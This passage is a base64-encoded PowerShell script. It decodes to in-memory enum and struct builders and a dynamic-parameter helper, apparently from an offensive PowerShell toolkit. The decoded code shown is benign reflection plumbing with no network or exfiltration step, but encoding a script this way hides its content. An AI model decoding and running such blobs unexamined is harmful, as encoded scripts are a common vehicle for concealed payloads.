lDQVRJT04gPSAxNgp9CgouTk9URVMKClBvd2VyU2hlbGwgcHVyaXN0cyBtYXkgZGlzYWdyZWUgd2l0aCB0aGUgbmFtaW5nIG9mIHRoaXMgZnVuY3Rpb24gYnV0CmFnYWluLCB0aGlzIHdhcyBkZXZlbG9wZWQgaW4gc3VjaCBhIHdheSBzbyBhcyB0byBlbXVsYXRlIGEgIkMgc3R5bGUiCmRlZmluaXRpb24gYXMgY2xvc2VseSBhcyBwb3NzaWJsZS4gU29ycnksIEknbSBub3QgZ29pbmcgdG8gbmFtZSBpdApOZXctRW51bS4gOlAKIz4KCiAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFR5cGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkRW51bUVsZW1lbnRzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRCaXRmaWVsZAogICAgKQoKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KCiAgICAkRW51bVR5cGUgPSAkVHlwZSAtYXMgW1R5cGVdCgogICAgJEVudW1CdWlsZGVyID0gJE1vZHVsZS5EZWZpbmVFbnVtKCRGdWxsTmFtZSwgJ1B1YmxpYycsICRFbnVtVHlwZSkKCiAgICBpZiAoJEJpdGZpZWxkKQogICAgewogICAgICAgICRGbGFnc0NvbnN0cnVjdG9yID0gW0ZsYWdzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihAKCkpCiAgICAgICAgJEZsYWdzQ3VzdG9tQXR0cmlidXRlID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkRmxhZ3NDb25zdHJ1Y3RvciwgQCgpKQogICAgICAgICRFbnVtQnVpbGRlci5TZXRDdXN0b21BdHRyaWJ1dGUoJEZsYWdzQ3VzdG9tQXR0cmlidXRlKQogICAgfQoKICAgIGZvcmVhY2ggKCRLZXkgaW4gJEVudW1FbGVtZW50cy5LZXlzKQogICAgewogICAgICAgICMgQXBwbHkgdGhlIHNwZWNpZmllZCBlbnVtIHR5cGUgdG8gZWFjaCBlbGVtZW50CiAgICAgICAgJG51bGwgPSAkRW51bUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgkS2V5LCAkRW51bUVsZW1lbnRzWyRLZXldIC1hcyAkRW51bVR5cGUpCiAgICB9CgogICAgJEVudW1CdWlsZGVyLkNyZWF0ZVR5cGUoKQp9CgoKIyBBIGhlbHBlciBmdW5jdGlvbiB1c2VkIHRvIHJlZHVjZSB0eXBpbmcgd2hpbGUgZGVmaW5pbmcgc3RydWN0CiMgZmllbGRzLgpmdW5jdGlvbiBmaWVsZCB7CiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1VJbnQxNl0KICAgICAgICAkUG9zaXRpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRUeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICAgICAgW1VJbnQxNl0KICAgICAgICAkT2Zmc2V0LAoKICAgICAgICBbT2JqZWN0W11dCiAgICAgICAgJE1hcnNoYWxBcwogICAgKQoKICAgIEB7CiAgICAgICAgUG9zaXRpb24gPSAkUG9zaXRpb24KICAgICAgICBUeXBlID0gJFR5cGUgLWFzIFtUeXBlXQogICAgICAgIE9mZnNldCA9ICRPZmZzZXQKICAgICAgICBNYXJzaGFsQXMgPSAkTWFyc2hhbEFzCiAgICB9Cn0KCgpmdW5jdGlvbiBzdHJ1Y3QKewo8IwouU1lOT1BTSVMKCkNyZWF0ZXMgYW4gaW4tbWVtb3J5IHN0cnVjdCBmb3IgdXNlIGluIHlvdXIgUG93ZXJTaGVsbCBzZXNzaW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IGZpZWxkCgouREVTQ1JJUFRJT04KClRoZSAnc3RydWN0JyBmdW5jdGlvbiBmYWNpbGl0YXRlcyB0aGUgY3JlYXRpb24gb2Ygc3RydWN0cyBlbnRpcmVseSBpbgptZW1vcnkgdXNpbmcgYXMgY2xvc2UgdG8gYSAiQyBzdHlsZSIgYXMgUG93ZXJTaGVsbCB3aWxsIGFsbG93LiBTdHJ1Y3QKZmllbGRzIGFyZSBzcGVjaWZpZWQgdXNpbmcgYSBoYXNodGFibGUgd2hlcmUgZWFjaCBmaWVsZCBvZiB0aGUgc3RydWN0CmlzIGNvbXByb3NlZCBvZiB0aGUgb3JkZXIgaW4gd2hpY2ggaXQgc2hvdWxkIGJlIGRlZmluZWQsIGl0cyAuTkVUCnR5cGUsIGFuZCBvcHRpb25hbGx5LCBpdHMgb2Zmc2V0IGFuZCBzcGVjaWFsIG1hcnNoYWxpbmcgYXR0cmlidXRlcy4KCk9uZSBvZiB0aGUgZmVhdHVyZXMgb2YgJ3N0cnVjdCcgaXMgdGhhdCBhZnRlciB5b3VyIHN0cnVjdCBpcyBkZWZpbmVkLAppdCB3aWxsIGNvbWUgd2l0aCBhIGJ1aWx0LWluIEdldFNpemUgbWV0aG9kIGFzIHdlbGwgYXMgYW4gZXhwbGljaXQKY29udmVydGVyIHNvIHRoYXQgeW91IGNhbiBlYXNpbHkgY2FzdCBhbiBJbnRQdHIgdG8gdGhlIHN0cnVjdCB3aXRob3V0CnJlbHlpbmcgdXBvbiBjYWxsaW5nIFNpemVPZiBhbmQvb3IgUHRyVG9TdHJ1Y3R1cmUgaW4gdGhlIE1hcnNoYWwKY2xhc3MuCgouUEFSQU1FVEVSIE1vZHVsZQoKVGhlIGluLW1lbW9yeSBtb2R1bGUgdGhhdCB3aWxsIGhvc3QgdGhlIHN0cnVjdC4gVXNlCk5ldy1Jbk1lbW9yeU1vZHVsZSB0byBkZWZpbmUgYW4gaW4tbWVtb3J5IG1vZHVsZS4KCi5QQVJBTUVURVIgRnVsbE5hbWUKClRoZSBmdWxseS1xdWFsaWZpZWQgbmFtZSBvZiB0aGUgc3RydWN0LgoKLlBBUkFNRVRFUiBTdHJ1Y3RGaWVsZHMKCkEgaGFzaHRhYmxlIG9mIGZpZWxkcy4gVXNlIHRoZSAnZmllbGQnIGhlbHBlciBmdW5jdGlvbiB0byBlYXNlCmRlZmluaW5nIGVhY2ggZmllbGQuCgouUEFSQU1FVEVSIFBhY2tpbmdTaXplCgpTcGVjaWZpZXMgdGhlIG1lbW9yeSBhbGlnbm1lbnQgb2YgZmllbGRzLgoKLlBBUkFNRVRFUiBFeHBsaWNpdExheW91dAoKSW5kaWNhdGVzIHRoYXQgYW4gZXhwbGljaXQgb2Zmc2V0IGZvciBlYWNoIGZpZWxkIHdpbGwgYmUgc3BlY2lmaWVkLgoKLkVYQU1QTEUKCiRNb2QgPSBOZXctSW5NZW1vcnlNb2R1bGUgLU1vZHVsZU5hbWUgV2luMzIKCiRJbWFnZURvc1NpZ25hdHVyZSA9IHBzZW51bSAkTW9kIFBFLklNQUdFX0RPU19TSUdOQVRVUkUgVUludDE2IEB7CiAgICBET1NfU0lHTkFUVVJFID0gICAgMHg1QTRECiAgICBPUzJfU0lHTkFUVVJFID0gICAgMHg0NTRFCiAgICBPUzJfU0lHTkFUVVJFX0xFID0gMHg0NTRDCiAgICBWWERfU0lHTkFUVVJFID0gICAgMHg0NTRDCn0KCiRJbWFnZURvc0hlYWRlciA9IHN0cnVjdCAkTW9kIFBFLklNQUdFX0RPU19IRUFERVIgQHsKICAgIGVfbWFnaWMgPSAgICBmaWVsZCAwICRJbWFnZURvc1NpZ25hdHVyZQogICAgZV9jYmxwID0gICAgIGZpZWxkIDEgVUludDE2CiAgICBlX2NwID0gICAgICAgZmllbGQgMiBVSW50MTYKICAgIGVfY3JsYyA9ICAgICBmaWVsZCAzIFVJbnQxNgogICAgZV9jcGFyaGRyID0gIGZpZWxkIDQgVUludDE2CiAgICBlX21pbmFsbG9jID0gZmllbGQgNSBVSW50MTYKICAgIGVfbWF4YWxsb2MgPSBmaWVsZCA2IFVJbnQxNgogICAgZV9zcyA9ICAgICAgIGZpZWxkIDcgVUludDE2CiAgICBlX3NwID0gICAgICAgZmllbGQgOCBVSW50MTYKICAgIGVfY3N1bSA9ICAgICBmaWVsZCA5IFVJbnQxNgogICAgZV9pcCA9ICAgICAgIGZpZWxkIDEwIFVJbnQxNgogICAgZV9jcyA9ICAgICAgIGZpZWxkIDExIFVJbnQxNgogICAgZV9sZmFybGMgPSAgIGZpZWxkIDEyIFVJbnQxNgogICAgZV9vdm5vID0gICAgIGZpZWxkIDEzIFVJbnQxNgogICAgZV9yZXMgPSAgICAgIGZpZWxkIDE0IFVJbnQxNltdIC1NYXJzaGFsQXMgQCgnQnlWYWxBcnJheScsIDQpCiAgICBlX29lbWlkID0gICAgZmllbGQgMTUgVUludDE2CiAgICBlX29lbWluZm8gPSAgZmllbGQgMTYgVUludDE2CiAgICBlX3JlczIgPSAgICAgZmllbGQgMTcgVUludDE2W10gLU1hcnNoYWxBcyBAKCdCeVZhbEFycmF5JywgMTApCiAgICBlX2xmYW5ldyA9ICAgZmllbGQgMTggSW50MzIKfQoKIyBFeGFtcGxlIG9mIHVzaW5nIGFuIGV4cGxpY2l0IGxheW91dCBpbiBvcmRlciB0byBjcmVhdGUgYSB1bmlvbi4KJFRlc3RVbmlvbiA9IHN0cnVjdCAkTW9kIFRlc3RVbmlvbiBAewogICAgZmllbGQxID0gZmllbGQgMCBVSW50MzIgMAogICAgZmllbGQyID0gZmllbGQgMSBJbnRQdHIgMAp9IC1FeHBsaWNpdExheW91dAoKLk5PVEVTCgpQb3dlclNoZWxsIHB1cmlzdHMgbWF5IGRpc2FncmVlIHdpdGggdGhlIG5hbWluZyBvZiB0aGlzIGZ1bmN0aW9uIGJ1dAphZ2FpbiwgdGhpcyB3YXMgZGV2ZWxvcGVkIGluIHN1Y2ggYSB3YXkgc28gYXMgdG8gZW11bGF0ZSBhICJDIHN0eWxlIgpkZWZpbml0aW9uIGFzIGNsb3NlbHkgYXMgcG9zc2libGUuIFNvcnJ5LCBJJ20gbm90IGdvaW5nIHRvIG5hbWUgaXQKTmV3LVN0cnVjdC4gOlAKIz4KCiAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTdHJ1Y3RGaWVsZHMsCgogICAgICAgIFtSZWZsZWN0aW9uLkVtaXQuUGFja2luZ1NpemVdCiAgICAgICAgJFBhY2tpbmdTaXplID0gW1JlZmxlY3Rpb24uRW1pdC5QYWNraW5nU2l6ZV06OlVuc3BlY2lmaWVkLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeHBsaWNpdExheW91dAogICAgKQoKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KCiAgICBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc10gJFN0cnVjdEF0dHJpYnV0ZXMgPSAnQW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0JwoKICAgIGlmICgkRXhwbGljaXRMYXlvdXQpCiAgICB7CiAgICAgICAgJFN0cnVjdEF0dHJpYnV0ZXMgPSAkU3RydWN0QXR0cmlidXRlcyAtYm9yIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXTo6RXhwbGljaXRMYXlvdXQKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkU3RydWN0QXR0cmlidXRlcyA9ICRTdHJ1Y3RBdHRyaWJ1dGVzIC1ib3IgW1JlZmxlY3Rpb24uVHlwZUF0dHJpYnV0ZXNdOjpTZXF1ZW50aWFsTGF5b3V0CiAgICB9CgogICAgJFN0cnVjdEJ1aWxkZXIgPSAkTW9kdWxlLkRlZmluZVR5cGUoJEZ1bGxOYW1lLCAkU3RydWN0QXR0cmlidXRlcywgW1ZhbHVlVHlwZV0sICRQYWNraW5nU2l6ZSkKICAgICRDb25zdHJ1Y3RvckluZm8gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcnMoKVswXQogICAgJFNpemVDb25zdCA9IEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKQoKICAgICRGaWVsZHMgPSBOZXctT2JqZWN0IEhhc2h0YWJsZVtdKCRTdHJ1Y3RGaWVsZHMuQ291bnQpCgogICAgIyBTb3J0IGVhY2ggZmllbGQgYWNjb3JkaW5nIHRvIHRoZSBvcmRlcnMgc3BlY2lmaWVkCiAgICAjIFVuZm9ydHVuYXRlbHksIFBTdjIgZG9lc24ndCBoYXZlIHRoZSBsdXh1cnkgb2YgdGhlCiAgICAjIGhhc2h0YWJsZSBbT3JkZXJlZF0gYWNjZWxlcmF0b3IuCiAgICBmb3JlYWNoICgkRmllbGQgaW4gJFN0cnVjdEZpZWxkcy5LZXlzKQogICAgewogICAgICAgICRJbmRleCA9ICRTdHJ1Y3RGaWVsZHNbJEZpZWxkXVsnUG9zaXRpb24nXQogICAgICAgICRGaWVsZHNbJEluZGV4XSA9IEB7RmllbGROYW1lID0gJEZpZWxkOyBQcm9wZXJ0aWVzID0gJFN0cnVjdEZpZWxkc1skRmllbGRdfQogICAgfQoKICAgIGZvcmVhY2ggKCRGaWVsZCBpbiAkRmllbGRzKQogICAgewogICAgICAgICRGaWVsZE5hbWUgPSAkRmllbGRbJ0ZpZWxkTmFtZSddCiAgICAgICAgJEZpZWxkUHJvcCA9ICRGaWVsZFsnUHJvcGVydGllcyddCgogICAgICAgICRPZmZzZXQgPSAkRmllbGRQcm9wWydPZmZzZXQnXQogICAgICAgICRUeXBlID0gJEZpZWxkUHJvcFsnVHlwZSddCiAgICAgICAgJE1hcnNoYWxBcyA9ICRGaWVsZFByb3BbJ01hcnNoYWxBcyddCgogICAgICAgICROZXdGaWVsZCA9ICRTdHJ1Y3RCdWlsZGVyLkRlZmluZUZpZWxkKCRGaWVsZE5hbWUsICRUeXBlLCAnUHVibGljJykKCiAgICAgICAgaWYgKCRNYXJzaGFsQXMpCiAgICAgICAgewogICAgICAgICAgICAkVW5tYW5hZ2VkVHlwZSA9ICRNYXJzaGFsQXNbMF0gLWFzIChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuVW5tYW5hZ2VkVHlwZV0pCiAgICAgICAgICAgIGlmICgkTWFyc2hhbEFzWzFdKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU2l6ZSA9ICRNYXJzaGFsQXNbMV0KICAgICAgICAgICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLAogICAgICAgICAgICAgICAgICAgICRVbm1hbmFnZWRUeXBlLCAkU2l6ZUNvbnN0LCBAKCRTaXplKSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCBbT2JqZWN0W11dIEAoJFVubWFuYWdlZFR5cGUpKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkTmV3RmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQogICAgICAgIH0KCiAgICAgICAgaWYgKCRFeHBsaWNpdExheW91dCkgeyAkTmV3RmllbGQuU2V0T2Zmc2V0KCRPZmZzZXQpIH0KICAgIH0KCiAgICAjIE1ha2UgdGhlIHN0cnVjdCBhd2FyZSBvZiBpdHMgb3duIHNpemUuCiAgICAjIE5vIG1vcmUgaGF2aW5nIHRvIGNhbGwgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YhCiAgICAkU2l6ZU1ldGhvZCA9ICRTdHJ1Y3RCdWlsZGVyLkRlZmluZU1ldGhvZCgnR2V0U2l6ZScsCiAgICAgICAgJ1B1YmxpYywgU3RhdGljJywKICAgICAgICBbSW50XSwKICAgICAgICBbVHlwZVtdXSBAKCkpCiAgICAkSUxHZW5lcmF0b3IgPSAkU2l6ZU1ldGhvZC5HZXRJTEdlbmVyYXRvcigpCiAgICAjIFRoYW5rcyBmb3IgdGhlIGhlbHAsIEphc29uIFNoaXJrIQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXS5HZXRNZXRob2QoJ1NpemVPZicsIFtUeXBlW11dIEAoW1R5cGVdKSkpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpSZXQpCgogICAgIyBBbGxvdyBmb3IgZXhwbGljaXQgY2FzdGluZyBmcm9tIGFuIEludFB0cgogICAgIyBObyBtb3JlIGhhdmluZyB0byBjYWxsIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUhCiAgICAkSW1wbGljaXRDb252ZXJ0ZXIgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ29wX0ltcGxpY2l0JywKICAgICAgICAnUHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZScsCiAgICAgICAgJFN0cnVjdEJ1aWxkZXIsCiAgICAgICAgW1R5cGVbXV0gQChbSW50UHRyXSkpCiAgICAkSUxHZW5lcmF0b3IyID0gJEltcGxpY2l0Q29udmVydGVyLkdldElMR2VuZXJhdG9yKCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpOb3ApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGRhcmdfMCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpMZHRva2VuLCAkU3RydWN0QnVpbGRlcikKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdQdHJUb1N0cnVjdHVyZScsIFtUeXBlW11dIEAoW0ludFB0cl0sIFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlVuYm94X0FueSwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQoKICAgICRTdHJ1Y3RCdWlsZGVyLkNyZWF0ZVR5cGUoKQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojIE1pc2MuIGhlbHBlcnMKIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKRnVuY3Rpb24gTmV3LUR5bmFtaWNQYXJhbWV0ZXIgewo8IwouU1lOT1BTSVMKCkhlbHBlciBmdW5jdGlvbiB0byBzaW1wbGlmeSBjcmVhdGluZyBkeW5hbWljIHBhcmFtZXRlcnMuCgogICAgQWRhcGF0ZWQgZnJvbSBodHRwczovL2JlYXRjcmFja2VyLndvcmRwcmVzcy5jb20vMjAxNS8wOC8xMC9keW5hbWljLXBhcmFtZXRlcnMtdmFsaWRhdGVzZXQtYW5kLWVudW1zLy4KICAgIE9yaWdpbmFsbHkgcmVsZWFzZWQgdW5kZXIgdGhlIE1pY3Jvc29mdCBQdWJsaWMgTGljZW5zZSAoTXMtUEwpLgoKLkRFU0NSSVBUSU9OCgpIZWxwZXIgZnVuY3Rpb24gdG8gc2ltcGxpZnkgY3JlYXRpbmcgZHluYW1pYyBwYXJhbWV0ZXJzLgoKRXhhbXBsZSB1c2UgY2FzZXM6CiAgICBJbmNsdWRlIHBhcmFtZXRlcnMgb25seSBpZiB5b3VyIGVudmlyb25tZW50IGRpY3RhdGVzIGl0CiAgICBJbmNsdWRlIHBhcmFtZXRlcnMgZGVwZW5kaW5nIG9uIHRoZSB2YWx1ZSBvZiBhIHVzZXItc3BlY2lmaWVkIHBhcmFtZXRlcgogICAgUHJvdmlkZSB0YWIgY29tcGxldGlvbiBhbmQgaW50ZWxsaXNlbnNlIGZvciBwYXJhbWV0ZXJzLCBkZXBlbmRpbmcgb24gdGhlIGVudmlyb25tZW50CgpQbGVhc2Uga2VlcCBpbiBtaW5kIHRoYXQgYWxsIGR5bmFtaWMgcGFyYW1ldGVycyB5b3UgY3JlYXRlLCB3aWxsIG5vdCBoYXZlIGNvcnJlc3BvbmRpbmcgdmFyaWFibGVzIGNyZWF0ZWQuCiAgICBVc2UgTmV3LUR5bmFtaWNQYXJhbWV0ZXIgd2l0aCAnQ3JlYXRlVmFyaWFibGVzJyBzd2l0Y2ggaW4geW91ciBtYWluIGNvZGUgYmxvY2ssCiAgICAoJ1Byb2Nlc3MnIGZvciBhZHZhbmNlZCBmdW5jdGlvbnMpIHRvIGNyZWF0ZSB0aG9zZSB2YXJpYWJsZXMuCiAgICBBbHRlcm5hdGl2ZWx5LCBtYW51YWxseSByZWZlcmVuY2UgJFBTQm91bmRQYXJhbWV0ZXJzIGZvciB0aGUgZHluYW1pYyBwYXJhbWV0ZXIgdmFsdWUuCgpUaGlzIGZ1bmN0aW9uIGhhcyB0d28gb3BlcmF0aW5nIG1vZGVzOgoKMS4gQWxsIGR5bmFtaWMgcGFyYW1ldGVycyBjcmVhdGVkIGluIG9uZSBwYXNzIHVzaW5nIHBpcGVsaW5lIGlucHV0IHRvIHRoZSBmdW5jdGlvbi4gVGhpcyBtb2RlIGFsbG93cyB0byBjcmVhdGUgZHluYW1pYyBwYXJhbWV0ZXJzIGVuIG1hc3NlLAp3aXRoIG9uZSBmdW5jdGlvbiBjYWxsLiBUaGVyZSBpcyBubyBuZWVkIHRvIGNyZWF0ZSBhbmQgbWFpbnRhaW4gY3VzdG9tIFJ1bnRpbWVEZWZpbmVkUGFyYW1ldGVyRGljdGlvbmFyeS4KCjIuIER5bmFtaWMgcGFyYW1ldGVycyBhcmUgY3JlYXRlZCBieSBzZXBhcmF0ZSBmdW5jdGlvbiBjYWxscyBhbmQgYWRkZWQgdG8gdGhlIFJ1bnRpbWVEZWZpbmVkUGFyYW1ldGVyRGljdGlvbmFyeSB5b3UgY3JlYXRlZCBiZWZvcmVoYW5kLgpUaGVuIHlvdSBvdXRwdXQgdGhpcyBSdW50aW1lRGVmaW5lZFBhcmFtZXRlckRpY3Rpb25hcnkgdG8gdGhlIHBpcGVsaW5lLiBUaGlzIGFsbG93cyBtb3JlIGZpbmUtZ3JhaW5lZCBjb250cm9sIG9mIHRoZSBkeW5hbWljIHBhcmFtZXRlcnMsCndpdGggY3VzdG9tIGNvbmRpdGlvbnMgYW5kIHNvIG9uLgoKLk5PVEVTCgpDcmVkaXRzIHRvIGpyaWNoNTIzIGFuZCByYW1ibGluZ2Nvb2tpZW1vbnN0ZXIgZm9yIHRoZWlyIGluaXRpYWwgY29kZSBhbmQgaW5zcGlyYXRpb246CiAgICBodHRwczovL2dpdGh1Yi5jb20vUmFtYmxpbmdDb29raWVNb25zdGVyL1Bvd2VyU2hlbGwvYmxvYi9tYXN0ZXIvTmV3LUR5bmFtaWNQYXJhbS5wczEKICAgIGh0dHA6Ly9yYW1ibGluZ2Nvb2tpZW1vbnN0ZXIud29yZHByZXNzLmNvbS8yMDE0LzExLzI3L3F1aWNrLWhpdHMtY3JlZGVudGlhbHMtYW5kLWR5bmFtaWMtcGFyYW1ldGVycy8KICAgIGh0dHA6Ly9qcmljaDUyMy53b3JkcHJlc3MuY29tLzIwMTMvMDUvMzAvcG93ZXJzaGVsbC1zaW1wbGUtd2F5LXRvLWFkZC1keW5hbWljLXBhcmFtZXRlcnMtdG8tYWR2YW5jZWQtZnVuY3Rpb24vCgpDcmVkaXQgdG8gQk0gZm9yIGFsaWFzIGFuZCB0eXBlIHBhcmFtZXRlcnMgYW5kIHRoZWlyIGhhbmRsaW5nCgouUEFSQU1FVEVSIE5hbWUKCk5hbWUgb2YgdGhlIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFR5cGUKClR5cGUgZm9yIHRoZSBkeW5hbWljIHBhcmFtZXRlci4gIERlZmF1bHQgaXMgc3RyaW5nCgouUEFSQU1FVEVSIEFsaWFzCgpJZiBzcGVjaWZpZWQsIG9uZSBvciBtb3JlIGFsaWFzZXMgdG8gYXNzaWduIHRvIHRoZSBkeW5hbWljIHBhcmFtZXRlcgoKLlBBUkFNRVRFUiBNYW5kYXRvcnkKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBNYW5kYXRvcnkgYXR0cmlidXRlIGZvciB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFBvc2l0aW9uCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgUG9zaXRpb24gYXR0cmlidXRlIGZvciB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIEhlbHBNZXNzYWdlCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgSGVscE1lc3NhZ2UgZm9yIHRoaXMgZHluYW1pYyBwYXJhbWV0ZXIKCi5QQVJ